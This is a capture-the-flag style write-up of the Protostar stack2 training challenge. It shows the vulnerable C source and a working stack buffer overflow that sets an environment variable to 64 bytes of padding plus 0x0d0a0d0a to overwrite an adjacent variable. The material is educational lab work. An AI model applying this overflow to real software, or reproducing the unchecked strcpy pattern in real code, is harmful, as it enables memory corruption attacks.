---
title: Protostar - Stack2
description: My writeup on stack2 challenge.
categories:
 - binary exploitation
tags: binary exploitation, protostar
---

You can find the protostar there > [Protostar](https://exploit-exercises.lains.space/protostar/){:target="_blank"}

We have the source code of the binary :

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

We have a variable `buffer` with 64bytes buffer, then we have the `getenv` function.

`getenv` -> get an environmental variable

`environmental variable` -> used to pass information into processes

The if statement says that if the `enviromental variable == NULL` will print the error message.

Then we have the `modified` variable with 0 value.

Again the vulnerable `strcpy` function.

`strcpy` ->  doesn’t do any length checking.

Then an if statement that if `modified == 0x0d0a0d0a` we get the flag.

Let's execute the binary.

```bash
user@protostar:/opt/protostar/bin$ ./stack2
stack2: please set the GREENIE environment variable
```

We have to set the environmental variable.

```bash
user@protostar:/opt/protostar/bin$ export GREENIE=pwn
user@protostar:/opt/protostar/bin$ ./stack2
Try again, you got 0x00000000
```

Perfect, now let's simply add our payload in enviromental variable.

`A * 64 + 0x0d0a0d0a in little endian`

```python
>>> from pwn import *
p>>> p32(0x0d0a0d0a)
b'\n\r\n\r'
```

```bash
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c 'print "A" * 64 + "\n\r\n\r"')
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
```

We can remove the variable now if we want.

```bash
user@protostar:/opt/protostar/bin$ unset GREENIE
```
